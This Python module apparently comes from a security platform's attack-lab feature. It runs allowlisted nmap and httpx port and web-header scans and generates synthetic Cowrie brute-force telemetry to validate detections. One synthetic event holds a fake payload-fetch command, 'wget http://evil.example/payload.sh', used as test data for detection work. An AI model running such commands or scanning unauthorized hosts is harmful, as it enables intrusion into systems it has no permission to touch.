"""Controlled attack-lab simulation tasks."""

from __future__ import annotations

import json
import logging
import re
import shutil
import socket
import subprocess
import threading
from datetime import UTC, datetime
from ipaddress import ip_network
from urllib.parse import urlparse

import httpx
from sqlalchemy import text

from .alerts_v2 import upsert_security_alert
from .audit import log_audit
from .db import SessionLocal
from .request_context import request_id_ctx
from .settings import settings
from .telemetry import ingest_telemetry_events

logger = logging.getLogger("secplat.attack_lab")

ATTACK_TASKS = {
    "port_scan": {
        "label": "Port scan",
        "description": "Enumerate open TCP ports against a target asset or host.",
    },
    "web_scan": {
        "label": "Web exposure scan",
        "description": "Check web headers and HTTP exposure indicators on a target URL.",
    },
    "brute_force_sim": {
        "label": "Brute-force simulation",
        "description": "Generate controlled Cowrie-style failed login telemetry for detection validation.",
    },
}


def _allowed_networks() -> list:
    raw = str(settings.ATTACK_LAB_ALLOWED_NETWORKS or "").strip()
    networks = []
    for part in raw.split(","):
        candidate = part.strip()
        if not candidate:
            continue
        try:
            networks.append(ip_network(candidate, strict=False))
        except ValueError:
            continue
    if not networks:
        networks = [
            ip_network("127.0.0.1/32"),
            ip_network("172.16.0.0/12"),
            ip_network("192.168.0.0/16"),
        ]
    return networks


def _target_host(target: str) -> str:
    raw = (target or "").strip()
    if not raw:
        return ""
    if raw.startswith(("http://", "https://")):
        return (urlparse(raw).hostname or "").strip()
    if ":" in raw:
        return raw.split(":", 1)[0].strip()
    return raw


def _target_allowed(target: str) -> bool:
    host = _target_host(target)
    if not host:
        return False
    try:
        ip = socket.gethostbyname(host)
    except OSError:
        return False
    try:
        ip_obj = ip_network(f"{ip}/32", strict=False)
    except ValueError:
        return False
    for network in _allowed_networks():
        if ip_obj.subnet_of(network):
            return True
    return False


def _ports_from_settings() -> list[int]:
    raw = str(settings.ATTACK_LAB_DEFAULT_PORTS or "").strip()
    ports: list[int] = []
    for part in raw.split(","):
        candidate = part.strip()
        if not candidate:
            continue
        try:
            port = int(candidate)
        except ValueError:
            continue
        if 1 <= port <= 65535:
            ports.append(port)
    return ports or [22, 80, 443, 3000, 5432]


def _socket_port_scan(target: str, ports: list[int], *, timeout_seconds: float = 0.8) -> dict:
    host = _target_host(target)
    open_ports: list[int] = []
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=timeout_seconds):
                open_ports.append(port)
        except OSError:
            continue
    return {"engine": "python-socket", "target": host, "open_ports": open_ports}


def _nmap_port_scan(target: str, ports: list[int]) -> dict:
    nmap_bin = str(settings.ATTACK_LAB_NMAP_BIN or "/usr/bin/nmap").strip()
    if not nmap_bin or not shutil.which(nmap_bin):
        return _socket_port_scan(target, ports)
    host = _target_host(target)
    command = [
        nmap_bin,
        "-Pn",
        "-p",
        ",".join(str(port) for port in ports),
        host,
        "-oG",
        "-",
    ]
    completed = subprocess.run(command, capture_output=True, text=True, timeout=120, check=False)
    stdout = completed.stdout or ""
    parsed_open: list[int] = []
    for line in stdout.splitlines():
        if "/open/" not in line:
            continue
        parts = line.split("\t")
        for field in parts:
            if field.startswith("Ports:"):
                for spec in field.replace("Ports:", "").split(","):
                    item = spec.strip()
                    if "/open/" not in item:
                        continue
                    try:
                        parsed_open.append(int(item.split("/", 1)[0]))
                    except (TypeError, ValueError):
                        continue
    return {
        "engine": "nmap",
        "target": host,
        "command": " ".join(command),
        "returncode": completed.returncode,
        "open_ports": sorted(set(parsed_open)),
        "stderr": (completed.stderr or "").strip(),
    }


def _nmap_web_scan(target: str) -> dict | None:
    nmap_bin = str(settings.ATTACK_LAB_NMAP_BIN or "/usr/bin/nmap").strip()
    if not nmap_bin or not shutil.which(nmap_bin):
        return None
    host = _target_host(target)
    timeout_seconds = max(30, int(settings.ATTACK_LAB_WEB_SCAN_TIMEOUT_SECONDS or 90))
    command = [
        nmap_bin,
        "-Pn",
        "-p",
        "80,443",
        "--script",
        "http-security-headers,http-methods,http-title,ssl-cert,ssl-enum-ciphers",
        host,
        "-oN",
        "-",
    ]
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        timeout=timeout_seconds,
        check=False,
    )
    stdout = completed.stdout or ""
    findings: list[str] = []
    open_ports: list[int] = []
    for line in stdout.splitlines():
        text_line = line.strip()
        if not text_line:
            continue
        for match in re.findall(r"(\d{1,5})/open", text_line):
            try:
                port = int(match)
            except ValueError:
                continue
            if 1 <= port <= 65535:
                open_ports.append(port)
        lowered = text_line.lower()
        if "vulnerable" in lowered or "unsafe" in lowered or "warning" in lowered:
            findings.append(text_line)
        elif text_line.startswith("|") and any(
            token in lowered
            for token in (
                "sslv2",
                "sslv3",
                "tlsv1.0",
                "method",
                "x-frame-options",
                "strict-transport-security",
                "content-security-policy",
                "x-content-type-options",
            )
        ):
            findings.append(text_line.lstrip("|_ ").strip())
    deduped_findings: list[str] = []
    for finding in findings:
        if finding not in deduped_findings:
            deduped_findings.append(finding)
    return {
        "engine": "nmap-nse",
        "target": host,
        "command": " ".join(command),
        "returncode": completed.returncode,
        "open_ports": sorted(set(open_ports)),
        "findings": deduped_findings,
        "finding_count": len(deduped_findings),
        "stderr": (completed.stderr or "").strip(),
    }


def _web_scan(target: str) -> dict:
    normalized_target = target if target.startswith(("http://", "https://")) else f"http://{target}"
    with httpx.Client(follow_redirects=True, timeout=15.0) as client:
        response = client.get(normalized_target)
    headers = {k.lower(): v for k, v in response.headers.items()}
    missing_headers = [
        header
        for header in (
            "strict-transport-security",
            "content-security-policy",
            "x-content-type-options",
            "x-frame-options",
            "referrer-policy",
        )
        if header not in headers
    ]
    findings: list[str] = []
    if missing_headers:
        findings.append(f"Missing security headers: {', '.join(missing_headers)}")
    server_header = headers.get("server")
    powered_by = headers.get("x-powered-by")
    if powered_by:
        findings.append(f"Technology disclosure via x-powered-by: {powered_by}")
    nmap_nse = _nmap_web_scan(normalized_target)
    if nmap_nse:
        findings.extend(list(nmap_nse.get("findings") or []))
    deduped_findings: list[str] = []
    for finding in findings:
        if finding and finding not in deduped_findings:
            deduped_findings.append(finding)
    return {
        "engine": "httpx+nmap" if nmap_nse else "httpx",
        "target": normalized_target,
        "status_code": response.status_code,
        "missing_security_headers": missing_headers,
        "server_header": server_header,
        "powered_by": powered_by,
        "findings": deduped_findings,
        "finding_count": len(deduped_findings),
        "nmap_nse": nmap_nse,
    }


def _create_incident_for_alert(
    db, *, alert: dict, requested_by: str, title: str, severity: str
) -> int | None:
    incident_row = (
        db.execute(
            text(
                """
                INSERT INTO incidents(title, severity, status, assigned_to, metadata)
                VALUES (:title, :severity, 'new', :assigned_to, CAST(:metadata AS jsonb))
                RETURNING id
                """
            ),
            {
                "title": title,
                "severity": severity,
                "assigned_to": requested_by,
                "metadata": json.dumps({"source": "attack_lab"}),
            },
        )
        .mappings()
        .first()
    )
    if not incident_row:
        return None
    incident_id = int(incident_row["id"])
    asset_key = str(alert.get("asset_key") or "")
    db.execute(
        text(
            """
            INSERT INTO incident_alerts(incident_id, asset_key, alert_id, added_by)
            VALUES (:incident_id, :asset_key, :alert_id, :added_by)
            ON CONFLICT (incident_id, asset_key) DO NOTHING
            """
        ),
        {
            "incident_id": incident_id,
            "asset_key": asset_key or f"attack-alert-{alert['alert_id']}",
            "alert_id": int(alert["alert_id"]),
            "added_by": requested_by,
        },
    )
    db.execute(
        text(
            """
            INSERT INTO incident_notes(incident_id, event_type, author, body, details)
            VALUES (:incident_id, 'alert_added', :author, :body, CAST(:details AS jsonb))
            """
        ),
        {
            "incident_id": incident_id,
            "author": requested_by,
            "body": "Attack-lab run generated and linked this alert automatically.",
            "details": json.dumps(
                {
                    "alert_id": int(alert["alert_id"]),
                    "source": alert.get("source"),
                    "severity": alert.get("severity"),
                }
            ),
        },
    )
    return incident_id


def _run_task(task_type: str, target: str, target_asset_key: str | None) -> dict:
    normalized_task = (task_type or "").strip().lower()
    if normalized_task == "port_scan":
        return _nmap_port_scan(target, _ports_from_settings())
    if normalized_task == "web_scan":
        return _web_scan(target)
    if normalized_task == "brute_force_sim":
        synthetic_events = [
            {
                "timestamp": datetime.now(UTC).isoformat().replace("+00:00", "Z"),
                "eventid": "cowrie.login.failed",
                "src_ip": "203.0.113.55",
                "username": "root",
                "message": "Attack-lab simulated brute-force attempt",
                "asset_key": target_asset_key,
            },
            {
                "timestamp": datetime.now(UTC).isoformat().replace("+00:00", "Z"),
                "eventid": "cowrie.command.input",
                "src_ip": "203.0.113.55",
                "input": "wget http://evil.example/payload.sh",
                "asset_key": target_asset_key,
            },
        ]
        return {"engine": "synthetic", "events": synthetic_events}
    raise ValueError("attack_task_invalid")


def _append_job_log(db, job_id: int, message: str) -> None:
    line = f"[{datetime.now(UTC).isoformat().replace('+00:00', 'Z')}] {message}"
    db.execute(
        text(
            """
            UPDATE scan_jobs
            SET log_output = COALESCE(log_output, '') || :line || E'\n'
            WHERE job_id = :job_id
            """
        ),
        {"job_id": job_id, "line": line},
    )
    db.commit()


def run_attack_lab_job(job_id: int) -> None:
    db = SessionLocal()
    try:
        db.execute(
            text(
                """
                UPDATE scan_jobs
                SET status = 'running', started_at = NOW(), finished_at = NULL, error = NULL
                WHERE job_id = :job_id
                """
            ),
            {"job_id": job_id},
        )
        db.commit()
        row = (
            db.execute(
                text(
                    """
                    SELECT
                      job_id,
                      requested_by,
                      COALESCE(job_params_json, '{}'::jsonb) AS job_params_json
                    FROM scan_jobs
                    WHERE job_id = :job_id
                    """
                ),
                {"job_id": job_id},
            )
            .mappings()
            .first()
        )
        if not row:
            raise ValueError("attack_lab_job_not_found")

        params = row.get("job_params_json") or {}
        if isinstance(params, str):
            params = json.loads(params)
        task_type = str(params.get("task_type") or "port_scan").strip().lower()
        target = str(params.get("target") or "").strip()
        target_asset_key = str(params.get("asset_key") or "").strip() or None
        requested_by = str(row.get("requested_by") or "analyst")
        if task_type not in ATTACK_TASKS:
            raise ValueError("attack_lab_task_unknown")
        if not target:
            raise ValueError("attack_lab_target_required")
        if not _target_allowed(target):
            raise ValueError("attack_lab_target_not_allowed")

        run_row = (
            db.execute(
                text(
                    """
                    INSERT INTO attack_lab_runs(
                      task_type, target_asset_key, target, status, requested_by, started_at
                    )
                    VALUES (:task_type, :target_asset_key, :target, 'running', :requested_by, NOW())
                    RETURNING run_id
                    """
                ),
                {
                    "task_type": task_type,
                    "target_asset_key": target_asset_key,
                    "target": target,
                    "requested_by": requested_by,
                },
            )
            .mappings()
            .first()
        )
        if not run_row:
            raise ValueError("attack_lab_run_insert_failed")
        run_id = int(run_row["run_id"])
        _append_job_log(db, job_id, f"Attack-lab run started run_id={run_id} task={task_type}")

        result = _run_task(task_type, target, target_asset_key)
        created_alert: dict | None = None
        incident_id: int | None = None
        if task_type == "port_scan":
            open_ports = list(result.get("open_ports") or [])
            if open_ports:
                created_alert = upsert_security_alert(
                    db,
                    source="attack_lab",
                    alert_type="port_scan",
                    title=f"Attack-lab detected open ports on {target}",
                    description=f"Open ports: {', '.join(str(p) for p in open_ports)}",
                    dedupe_key=f"attack-lab:port-scan:{target}:{','.join(str(p) for p in open_ports)}",
                    severity="high"
                    if any(p in {22, 3389, 5432, 6379} for p in open_ports)
                    else "medium",
                    asset_key=target_asset_key,
                    context_json={"task_type": task_type, "target": target},
                    payload_json=result,
                )
        elif task_type == "web_scan":
            findings = list(result.get("findings") or [])
            if findings:
                created_alert = upsert_security_alert(
                    db,
                    source="attack_lab",
                    alert_type="web_scan",
                    title=f"Attack-lab web scan findings for {target}",
                    description=f"Detected {len(findings)} web exposure finding(s)",
                    dedupe_key=f"attack-lab:web-scan:{target}:{','.join(sorted(findings)[:5])}",
                    severity="high" if len(findings) >= 5 else "medium",
                    asset_key=target_asset_key,
                    context_json={"task_type": task_type, "target": target},
                    payload_json=result,
                )
        elif task_type == "brute_force_sim":
            synthetic = list(result.get("events") or [])
            summary = ingest_telemetry_events(
                db,
                source="cowrie",
                events=synthetic,
                default_asset_key=target_asset_key,
                create_alerts=True,
            )
            result["ingest_summary"] = summary
            created_alert = upsert_security_alert(
                db,
                source="attack_lab",
                alert_type="brute_force_sim",
                title=f"Attack-lab brute-force simulation on {target}",
                description="Generated Cowrie telemetry to validate brute-force detections.",
                dedupe_key=f"attack-lab:brute-force:{target}:{datetime.now(UTC).strftime('%Y%m%d%H')}",
                severity="high",
                asset_key=target_asset_key,
                context_json={"task_type": task_type, "target": target},
                payload_json=result,
            )

        if created_alert:
            incident_id = _create_incident_for_alert(
                db,
                alert=created_alert,
                requested_by=requested_by,
                title=f"Attack-lab incident: {created_alert.get('title')}",
                severity=str(created_alert.get("severity") or "medium"),
            )
            result["alert"] = {
                "alert_id": created_alert.get("alert_id"),
                "source": created_alert.get("source"),
                "severity": created_alert.get("severity"),
                "status": created_alert.get("status"),
            }
            if incident_id:
                result["incident_id"] = incident_id

        db.execute(
            text(
                """
                UPDATE attack_lab_runs
                SET status = 'done', finished_at = NOW(), output_json = CAST(:output_json AS jsonb)
                WHERE run_id = :run_id
                """
            ),
            {"run_id": run_id, "output_json": json.dumps(result)},
        )
        db.execute(
            text(
                """
                UPDATE scan_jobs
                SET status = 'done', finished_at = NOW()
                WHERE job_id = :job_id
                """
            ),
            {"job_id": job_id},
        )
        db.commit()
        _append_job_log(
            db,
            job_id,
            f"Attack-lab run completed run_id={run_id} alert_id={result.get('alert', {}).get('alert_id')}",
        )
        log_audit(
            db,
            "attack_lab_run",
            user_name=requested_by,
            asset_key=target_asset_key,
            details={
                "job_id": job_id,
                "run_id": run_id,
                "task_type": task_type,
                "target": target,
                "incident_id": incident_id,
            },
            request_id=request_id_ctx.get(None),
        )
        db.commit()
    except Exception as exc:
        logger.exception("attack_lab_job_failed job_id=%s", job_id)
        db.execute(
            text(
                """
                UPDATE scan_jobs
                SET status = 'failed', finished_at = NOW(), error = :error
                WHERE job_id = :job_id
                """
            ),
            {"job_id": job_id, "error": str(exc)},
        )
        db.commit()
        _append_job_log(db, job_id, f"Attack-lab run failed: {exc}")
    finally:
        db.close()


def launch_attack_lab_job(job_id: int) -> None:
    thread = threading.Thread(
        target=run_attack_lab_job,
        args=(job_id,),
        name=f"attack-lab-job-{job_id}",
        daemon=True,
    )
    thread.start()
